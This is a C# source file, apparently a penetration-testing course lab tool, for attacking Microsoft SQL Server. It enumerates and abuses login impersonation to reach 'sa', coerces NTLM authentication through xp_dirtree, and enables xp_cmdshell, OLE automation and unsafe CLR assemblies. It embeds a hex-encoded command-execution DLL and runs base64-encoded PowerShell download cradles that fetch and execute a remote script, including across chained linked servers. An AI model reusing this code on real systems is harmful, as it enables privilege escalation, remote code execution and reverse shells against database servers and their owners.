using System;
using System.Data.SqlClient;
using System.Linq;
using System.Text;

namespace SQL
{
    public class Program
    {
        public static void Main(string[] args)
        {
            //string sqlServer = args[0];

            try
            {
                LinkedServers();
            }
            catch (Exception e)
            {
                throw new Exception("An error occured while executing CustomAssembly method:\n{0}", e);
            }
            return;

            #region TestConnection
            /* Building a connection string and connect to the Server */
            string sqlServer = "DB02"; // Fill in the FQDN of the SQL server
            string database = "master"; // The default DB (Or choose any other DB you know that exists)

            // Integrated Security = True; is for windows authentication
            string conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";

            // Another example of connection strring
            //string sqlServer = "DB02\\SQLEXPRESS,1433";
            //string database = "dashboard";
            //string conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = SSPI;";

            SqlConnection con = new SqlConnection(conString);

            Console.WriteLine($"Attempting connection to: {sqlServer}");
            try
            {
                con.Open();
                Console.WriteLine("[+] Auth Succeedded! Connected to the server {0} using the DB {1}\n", sqlServer, database);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Auth Failed! Reason: {0}" + e.GetType());
                return;
            }

            #endregion TestConnection

            string query;

            #region Who We Are
            /* Determine which domain user account we are running as (admin, offsec...) */
            query = "SELECT SYSTEM_USER;";
            QueryDB(query, con);

            /* Determine which SQL account, our domain user account was mapped to (sa, guest..) */
            query = "SELECT USER_NAME();";
            QueryDB(query, con);

            /* Determine which role our current SQL account have (sysadmin, public...) */
            // Return bool, 1 for true and 0 for false so Im using SQL print function for clarity
            Console.WriteLine("[+] 1 = True, 0 = False");

            query = "SELECT IS_SRVROLEMEMBER('public');";
            QueryDB(query, con);

            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            QueryDB(query, con);
            #endregion Who We Are


            //#region PassTheHash
            ///* Try to force NTLM Auth via UNC Path and xp_dirtree */
            //// Its important to provide the function an IP address so windows won't use Kerberos Authentication
            //Console.Write("\n[+] Using xp_dirtree to catch or relay Net-NTLMv2." +
            //    "Hit enter when Responder/Relay is ready... ");
            //Console.Read();
            ////query = "EXEC master..xp_dirtree \"\\\\192.168.49.230\\\\NTHASH\";";
            //query = "EXEC master..xp_dirtree \"\\\\web05\\pipe\\piper\"; ";

            //QueryDB(query, con);
            //#endregion PassTheHash

            #region Impersonation
            /* Enumerate which SQL users can be impersonated (not who allowed to impersonate)
             * This doesn't necceseraly means that our current login user is allowed to do so
             */
            Console.WriteLine("[+] Checking Login Users/Roles that allowed to be impersonated");

            // The query below return the impseronatable users but the not the user who can impersonate them
            query = "SELECT distinct b.name " +
                "FROM sys.server_permissions a INNER JOIN sys.server_principals b " +
                "on a.grantor_principal_id = b.principal_id " +
                "WHERE a.permission_name = 'IMPERSONATE';";
            QueryDB(query, con);
            
            // dev_int
            
            /* Impersonate a LOGIN */
            string executeAsLogin = "use master; EXECUTE AS LOGIN = 'dev_int';";
            query = "SELECT SYSTEM_USER;";
            QueryDB(executeAsLogin, con); // Impersonate
            QueryDB(query, con); // Execute query as the impersonated user

            /* Impersonate a USER */
            // An example for impersonation of EXECUTE AS USER (as the 'dbo' role)
            //string executeAsUser = "use msdb; EXECUTE AS USER = 'dbo';";
            //string executeAsUser = "EXECUTE AS USER = 'dbo';";
            query = "SELECT USER_NAME();";
            //QueryDB(executeAsUser, con);
            QueryDB(query, con);
            #endregion Impersonation

            #region StoredProcedures To RCE
            /////* Executing Commands on the server via xp_cmdshell - Maximum payload length is 128 */
            //Console.WriteLine("[+] 0 = True, 1 = False");

            //string enableXPCmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; " +
            //    "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            //string execCmd = "EXEC xp_cmdshell whoami;";


            //// IEX(New-Object Net.Webclient).DownloadString("http://192.168.49.78/phishing/sc_runner.ps1")
            //string revShell = "EXEC xp_cmdshell \"powershell IEX(New-Object Net.Webclient).DownloadString('http://192.168.49.84/phishing/sc_runner.txt')\"";
            //// string revShellEncoded = "powershell -enc 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA4ADQALwBwAGgAaQBzAGgAaQBuAGcALwBzAGMAXwByAHUAbgBuAGUAcgAuAHQAeAB0ACIAKQA='";

            //QueryDB(executeAsLogin, con); // Impersonate SA
            //QueryDB(enableXPCmd, con); // Enable xp_cmdshell
            //QueryDB(execCmd, con);
            //QueryDB(revShell, con); // Execute command

            /* Executing Commands on the server via sp_OACreate and sp_oamethod */
            //string enableOle = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            //// Executing the Run method from wscript.shell with an arbitrary command as a string
            //string execOleCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; " +
            //    "EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo pwned > C:\\poc.txt\"';";

            //string revShell2 = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; " +
            //    "EXEC sp_oamethod @myshell, 'run', null, '" + revShellEncoded + "'";

            //QueryDB(executeAsLogin, con); // Impersonate SA
            //QueryDB(enableOle, con); // Enable xp_cmdshell
            //QueryDB(revShell2, con); // Execute command

            #endregion StoredProcedures To RCE

            con.Close();

        }

        static void CustomAssembly()
        {
            string enableCLRIntegration = "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE;";
            enableCLRIntegration += " EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"; // From MS-SQL 2017 onwards, microsoft disabled the ability to run unsigned assembly, therfore we need to disable this security mechanism as well

            /* Load an assembly either from file stored on the traget machine (or from remote UNC if target windows server <= 2016)*/
            string assemblyName = "myAssembly"; // The assembly name in the DB (Arbitrary name)
            string sp_Name = "sp_ShellExec"; // The new Stored Procedure in the DB (Arbitrary name)
            
            // This is the assembly file location or its hex string value. File have to be in qoutes and hex not
            string assemblyPathOrContent = @"'C:\sp_ShellExec.dll'";
            assemblyPathOrContent = @"0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000005045000064860200d30d75f40000000000000000f00022200b023000000c000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000b80300000000000000000000000000000000000000000000000000004c2a0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002e74657874000000f20a000000200000000c000000020000000000000000000000000000200000602e72737263000000b80300000040000000040000000e0000000000000000000000000000400000400000000000000000000000000000000000000000000000000000000000000000000000000000000048000000020005001421000038090000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600b500000001000011731000000a0a066f1100000a72010000706f1200000a066f1100000a7275000070028c12000001281300000a6f1400000a066f1100000a166f1500000a066f1100000a176f1600000a066f1700000a26178d170000012516729d0000701f0c20a00f00006a731800000aa2731900000a0b281a00000a076f1b00000a0716066f1c00000a6f1d00000a6f1e00000a6f1f00000a281a00000a076f2000000a281a00000a6f2100000a066f2200000a066f2300000a2a1e02282400000a2a00000042534a4201000100000000000c00000076342e302e33303331390000000005006c000000b8020000237e0000240300000004000023537472696e67730000000024070000ac00000023555300d0070000100000002347554944000000e00700005801000023426c6f620000000000000002000001471502000900000000fa013300160000010000001c000000020000000200000001000000240000000f000000010000000100000003000000000069020100000000000600930121030600000221030600b100ef020f00410300000600d90085020600760185020600570185020600e70185020600b30185020600cc0185020600060185020600c50002030600a300020306003a018502060021013202060093037e020a00f000ce020a004c0250030e007603ef020a006700ce020e00a502ef02060062027e020a002000ce020a00930014000a00e503ce020a008b00ce020600b6020a000600c3020a000000000001000000000001000100010010006503000041000100010048200000000096003500620001000921000000008618e90206000200000001005b000900e90201001100e90206001900e9020a002900e90210003100e90210003900e90210004100e90210004900e90210005100e90210005900e90210006100e90215006900e90210007100e90210007900e90210008900e90206009900e9020600990097022100a90075001000b1008c032600a9007e031000a9001e021500a900ca0315009900b1032c00b900e9023000a100e9023800c90082003f00d100a60344009900b7034a00e10042004f00810056024f00a1005f025300d100f0034400d1004c00060099009a03060099009d0006008100e902060020007b0052012e000b0068002e00130071002e001b0090002e00230099002e002b00af002e003300af002e003b00af002e00430099002e004b00b5002e005300af002e005b00af002e006300cd002e006b00f7002e00730004011a000480000001000000000000000000000000006503000004000000000000000000000059002c0000000000040000000000000000000000590014000000000004000000000000000000000059007e02000000000000003c4d6f64756c653e0053797374656d2e494f0053797374656d2e446174610053716c4d65746144617461006d73636f726c69620073705f5368656c6c457865630052656164546f456e640053656e64526573756c7473456e640065786563436f6d6d616e640053716c446174615265636f7264007365745f46696c654e616d65006765745f506970650053716c506970650053716c44625479706500436c6f736500477569644174747269627574650044656275676761626c6541747472696275746500436f6d56697369626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b417474726962757465005461726765744672616d65776f726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c457865637574650053797374656d2e52756e74696d652e56657273696f6e696e670053716c537472696e6700546f537472696e6700536574537472696e670053746f72656450726f636564757265732e646c6c0053797374656d0053797374656d2e5265666c656374696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d5265616465720054657874526561646572004d6963726f736f66742e53716c5365727665722e536572766572002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e496e7465726f7053657276696365730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053797374656d2e446174612e53716c54797065730053746f72656450726f636564757265730050726f63657373007365745f417267756d656e747300466f726d6174004f626a6563740057616974466f72457869740053656e64526573756c74735374617274006765745f5374616e646172644f7574707574007365745f52656469726563745374616e646172644f75747075740053716c436f6e746578740053656e64526573756c7473526f770000007343003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c00570069006e0064006f007700730050006f007700650072005300680065006c006c005c00760031002e0030005c0070006f007700650072007300680065006c006c002e00650078006500002720002d0077002000680069006400640065006e0020002d0065006e00630020007b0030007d00010d6f00750074007000750074000000b29b097e4f4c6a41a6462ce212cb5c3400042001010803200001052001011111042001010e0420010102060702124d125104200012550500020e0e1c03200002072003010e11610a062001011d125d0400001269052001011251042000126d0320000e05200201080e08b77a5c561934e0890500010111490801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001053746f72656450726f63656475726573000005010000000017010012436f7079726967687420c2a920203230323200002901002464383538346565622d376132302d346162652d386134352d66363130633133303233663700000c010007312e302e302e3000004d01001c2e4e45544672616d65776f726b2c56657273696f6e3d76342e372e320100540e144672616d65776f726b446973706c61794e616d65142e4e4554204672616d65776f726b20342e372e320401000000000000000041b547ba00000000020000006e000000842a0000840c000000000000000000000000000010000000000000000000000000000000525344537678f7ee6b116847815715280a2055cb01000000433a5c55736572735c6d656e74655c736f757263655c7265706f735c53514c5c53746f72656450726f636564757265735c6f626a5c7836345c52656c656173655c53746f72656450726f636564757265732e70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000530074006f00720065006400500072006f00630065006400750072006500730000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000530074006f00720065006400500072006f0063006500640075007200650073002e0064006c006c00000000004800120001004c006500670061006c0043006f007000790072006900670068007400000043006f0070007900720069006700680074002000a90020002000320030003200320000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000530074006f00720065006400500072006f0063006500640075007200650073002e0064006c006c0000000000420011000100500072006f0064007500630074004e0061006d00650000000000530074006f00720065006400500072006f00630065006400750072006500730000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            string loadAssemblyLocal = $"CREATE ASSEMBLY {assemblyName} FROM {assemblyPathOrContent} WITH PERMISSION_SET = UNSAFE";
            // string loadAssemblyHex = @"CREATE ASSEMBLY myAssembly FROM 0x4D5A.... WITH PERMISSION_SET = UNSAFE";

            string createSP = $"CREATE PROCEDURE [dbo].[{sp_Name}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{assemblyName}].[StoredProcedures].[{sp_Name}]";
            string executeCustomSP = $"exec {sp_Name} 'whoami'"; // This is whoami since our dll is launching cmd and execute the arg here
            // RevShell by using Download Cradle locate at phishing/sc_runner.ps1
            executeCustomSP = $"exec {sp_Name} 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA3ADgALwBwAGgAaQBzAGgAaQBuAGcALwBzAGMAXwByAHUAbgBuAGUAcgAuAHAAcwAxACIAKQA='";

            /* Delete all regions here when youll create tem as methods to invoke*/
            
            #region TestConnection
            /* Building a connection string and connect to the Server */
            string sqlServer = "dc01.corp1.com"; // Fill in the FQDN of the SQL server
            string database = "master"; // The default DB (Or choose any other DB you know taht exists)

            // Integrated Security = True; is for windows authentication
            string conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("[+] Auth Succeedded! Connected to the server {0} using the DB {1}\n", sqlServer, database);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Auth Failed! Reason: {0}" + e.GetType());
                return;
            }

            #endregion TestConnection

            #region Impersonation
            /* Enumerate which SQL users can be impersonated (not who allowed to impersonate)
             * This doesn't necceseraly means that our current login user is allowed to do so
             */
            Console.WriteLine("[+] Checking Login Users/Roles that allowed to be impersonated");
            string query = "PLACEHOLDER";
            query = "SELECT distinct b.name " +
                "FROM sys.server_permissions a INNER JOIN sys.server_principals b " +
                "on a.grantor_principal_id = b.principal_id " +
                "WHERE a.permission_name = 'IMPERSONATE';";
            QueryDB(query, con);

            /* Impersonate a LOGIN */
            // The query below return the impseronatable users but the not the user who can impersonate them
            string executeAsLogin = "EXECUTE AS LOGIN = 'sa';";
            query = "SELECT SYSTEM_USER;";
            QueryDB(executeAsLogin, con); // Impersonate
            QueryDB(query, con); // Execute query as the impersonated user
            #endregion Impersonation

            /* Disable security and enable Custom assembly loading and sop creation */
            QueryDB(enableCLRIntegration, con);

            /* Load the assembly and create  the StoredProcedure */
            QueryDB(loadAssemblyLocal, con);
            QueryDB(createSP, con);
            QueryDB(executeCustomSP, con);

            /* Delete our assembly and Stored Procedure */
            // Code after impersonating sa (Or anyother user with DBO role), and in the context of the DB we create the Assembly at
            string dropSP = $"DROP PROCEDURE {sp_Name};"; // The name you gave to the SP
            string dropAsm = $"DROP ASSEMBLY {assemblyName};"; // the name you gave to the asm
            QueryDB(dropSP, con);
            QueryDB(dropAsm, con);


            con.Close();
        }

        static void LinkedServers()
        {
            /* Delete all regions here when youll create tem as methods to invoke*/

            #region TestConnection
            /* Building a connection string and connect to the Server */
            //string sqlServer = "DB02"; // Fill in the FQDN of the SQL server
            //string database = "master"; // The default DB (Or choose any other DB you know taht exists)

            //// Integrated Security = True; is for windows authentication
            //string conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";

            string sqlServer = "DB01\\SQLEXPRESS,1433";
            string database = "dashboard";
            string conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = SSPI;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("[+] Auth Succeedded! Connected to the server {0} using the DB {1}\n", sqlServer, database);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Auth Failed! Reason: {0}", e.GetType());
                return;
            }

            #endregion TestConnection

            #region Impersonation
            /* Enumerate which SQL users can be impersonated (not who allowed to impersonate)
             * This doesn't necceseraly means that our current login user is allowed to do so
             */
            Console.WriteLine("[+] Checking Login Users/Roles that allowed to be impersonated");
            string query = "PLACEHOLDER";
            query = "SELECT distinct b.name " +
                "FROM sys.server_permissions a INNER JOIN sys.server_principals b " +
                "on a.grantor_principal_id = b.principal_id " +
                "WHERE a.permission_name = 'IMPERSONATE';";
            QueryDB(query, con);

            /* Impersonate a LOGIN */
            // The query below return the impseronatable users but the not the user who can impersonate them
            string executeAsLogin = "use master; EXECUTE AS LOGIN = 'dev_int';";
            query = "SELECT SYSTEM_USER;";
            QueryDB(executeAsLogin, con); // Impersonate
            QueryDB(query, con); // Execute query as the impersonated user
            #endregion Impersonation

            // Check linked server
            query = "EXEC sp_linkedservers;";
            Console.WriteLine("Checking for linked Servers");
            QueryDB(query, con);

            // Execute queries on the linked server
            //query = "select version from openquery(\"DB02\", 'select @@version as version');";
            query = "select USER_NAME from openquery(\"DB02\", 'SELECT USER_NAME() as USER_NAME');";
            QueryDB(query, con);

            // The next query runs as dev_lab
            query = "select curruser from openquery(\"DB02\", 'select SYSTEM_USER as curruser');";
            QueryDB(query, con);

            #region Who We Are
            /* Determine which SQL account, our domain user account was mapped to (sa, guest..) */
            query = "SELECT USER_NAME();";
            QueryDB(query, con);
            query = "SELECT IS_SRVROLEMEMBER('public');";
            QueryDB(query, con);
            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            QueryDB(query, con);

            query = "EXECUTE AS USER = 'dbo';";
            QueryDB(query, con);
            query = "SELECT IS_SRVROLEMEMBER('public');";
            QueryDB(query, con);
            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            QueryDB(query, con);

            string executeAsLogin2 = "use master; EXECUTE AS LOGIN = 'dev_lab';";
            query = "SELECT SYSTEM_USER;";
            QueryDB(executeAsLogin2, con); // Impersonate
            QueryDB(query, con); // Execute query as the impersonated user

            /* Determine which role our current SQL account have (sysadmin, public...) */
            // Return bool, 1 for true and 0 for false so Im using SQL print function for clarity
            Console.WriteLine("[+] 1 = True, 0 = False");
            query = "SELECT IS_SRVROLEMEMBER('public');";
            QueryDB(query, con);
            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            QueryDB(query, con);
            #endregion Who We Are


            return;
            
            query = "EXEC ('sp_linkedservers') AT DB02;";
            Console.WriteLine("Checking for double linked Servers");
            QueryDB(query, con);

            // Execute queries on the double linked server
            Console.WriteLine("Checking who we are on second hop linked Servers");
            string esacpeQoutes = new string('\'', 2);
            // The second hop server
            string interalQuery = $"SELECT curruser from openquery(\"DB01\", {esacpeQoutes}select SYSTEM_USER as curruser{esacpeQoutes});";
            // The first hop server
            query = $"SELECT curruser FROM openquery(\"DB02\", '{interalQuery}');";
            QueryDB(query, con);

            Console.WriteLine("Here comes the thirth hope");
            query = "SELECT curruser from openquery(\"DB01\", 'SELECT curruser from openquery(\"DB02\", ''''SELECT curruser from openquery(\"DB01\", ''SELECT SYSTEM_USER as curruser'') '''')')";
            QueryDB(query, con);

            //// Enable xp_cmdshell at the doubled linked server and get revshell with Download Cradle
            //// The outer server is the first hope, the innter server is the second hope
            //// The outer will execute the query on the inner
            //query = "EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT DB01') AT DB02;";
            //QueryDB(query, con);
            //query = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT DB01') AT DB02;";
            //QueryDB(query, con);
            //string revShell = "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA4ADQALwBwAGgAaQBzAGgAaQBuAGcALwBzAGMAXwByAHUAbgBuAGUAcgAuAHQAeAB0ACIAKQA=";
            //query = $"EXEC('EXEC (''xp_cmdshell ''''{revShell}'''';'') AT DB01') AT DB02;";
            //QueryDB(query, con);

            // Enable xp_cmdshell at linked server and get revshell with Download Cradle
            //query = "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT dc01;";
            //QueryDB(query, con);
            //query = "EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT dc01;";
            //QueryDB(query, con);
            //query = "EXEC('xp_cmdshell ''powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA3ADgALwBwAGgAaQBzAGgAaQBuAGcALwBzAGMAXwByAHUAbgBuAGUAcgAuAHAAcwAxACIAKQA='';') AT dc01;";
            //QueryDB(query, con);

        }

        /* This section is only for OSEP, integrate it with the above LinkedServer method to enumerate linked server recursively */
        static void DoubleLinkedServers()
        {
            /* Delete all regions here when youll create tem as methods to invoke*/

            #region TestConnection
            /* Building a connection string and connect to the Server */
            string sqlServer = "appsrv01.corp1.com"; // Fill in the FQDN of the SQL server
            string database = "master"; // The default DB (Or choose any other DB you know that exists)

            // Integrated Security = True; is for windows authentication
            string conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("[+] Auth Succeedded! Connected to the server {0} using the DB {1}\n", sqlServer, database);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Auth Failed! Reason: {0}" + e.GetType());
                return;
            }

            #endregion TestConnection

            #region Impersonation
            /* Enumerate which SQL users can be impersonated (not who allowed to impersonate)
             * This doesn't necceseraly means that our current login user is allowed to do so
             */
            Console.WriteLine("[+] Checking Login Users/Roles that allowed to be impersonated");
            string query = "PLACEHOLDER";
            query = "SELECT distinct b.name " +
                "FROM sys.server_permissions a INNER JOIN sys.server_principals b " +
                "on a.grantor_principal_id = b.principal_id " +
                "WHERE a.permission_name = 'IMPERSONATE';";
            QueryDB(query, con);

            /* Impersonate a LOGIN */
            // The query below return the impseronatable users but the not the user who can impersonate them
            string executeAsLogin = "EXECUTE AS LOGIN = 'sa';";
            query = "SELECT SYSTEM_USER;";
            QueryDB(executeAsLogin, con); // Impersonate
            QueryDB(query, con); // Execute query as the impersonated user
            #endregion Impersonation

            /* First linked server */
            // Check linked server
            query = "EXEC sp_linkedservers;";
            Console.WriteLine("Checking for linked Servers");
            QueryDB(query, con);

            // Execute queries on the linked server
            query = "select version from openquery(\"dc01\", 'select @@version as version');";
            QueryDB(query, con);
            query = "select curruser from openquery(\"dc01\", 'select SYSTEM_USER as curruser');";
            QueryDB(query, con);

            /* Second linked server */
            // Check Linked server
            query = "EXEC ('sp_linkedservers') AT DC01;";
            Console.WriteLine("Checking for double linked Servers");
            QueryDB(query, con);

            // Execute queries on the double linked server
            Console.WriteLine("Checking who we are on second hop linked Servers");
            string esacpeQoutes = new string('\'', 2);
            // The second hop server
            string interalQuery = $"SELECT curruser from openquery(\"appsrv01\", {esacpeQoutes}select SYSTEM_USER as curruser{esacpeQoutes});";
            // The first hop server
            query = $"SELECT curruser FROM openquery(\"dc01\", '{interalQuery}');";

            QueryDB(query, con);


            // Enable xp_cmdshell at the doubled linked server and get revshell with Download Cradle
            // The outer server is the first hope, the innter server is the second hope
            // The outer will execute the query on the inner
            query = "EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01;";
            QueryDB(query, con);
            query = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01;";
            QueryDB(query, con);
            string revShell = "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgAxADIAOAAvAHAAaABpAHMAaABpAG4AZwAvAHMAYwBfAHIAdQBuAG4AZQByAC4AcABzADEAIgApAA==";
            query = $"EXEC('EXEC (''xp_cmdshell ''''{revShell}'''';'') AT appsrv01') AT dc01;";
            QueryDB(query, con);

        }

        static void QueryDB(string query, SqlConnection con)
        {
            SqlCommand command = new SqlCommand(query, con);
            string seperator = new string('=', 20);
            SqlDataReader reader;

            try
            {
                reader = command.ExecuteReader(); // reader holds the data in an object

                if (reader.HasRows)
                {
                    // Iterate if there are multiple results. The new results will be pushed again to reader[0] after reading The old one
                    Console.WriteLine($"\nQuery Executed: {query}\nQuery Result:");
                    while (reader.Read()) { Console.WriteLine(reader[0]); }
                    Console.WriteLine(seperator);
                }
                else
                    Console.WriteLine($"\n[-] No rows returned from query: {query}\n{seperator}");
            }
            catch (Exception e)
            {
                Console.WriteLine("\n[-] Query Failed: \"{0}\"\nReason: {1}\n{2}", query, e.Message, seperator);
                return;
            }
            reader.Close(); // Close the reader after each SQL query
        }
    }
}
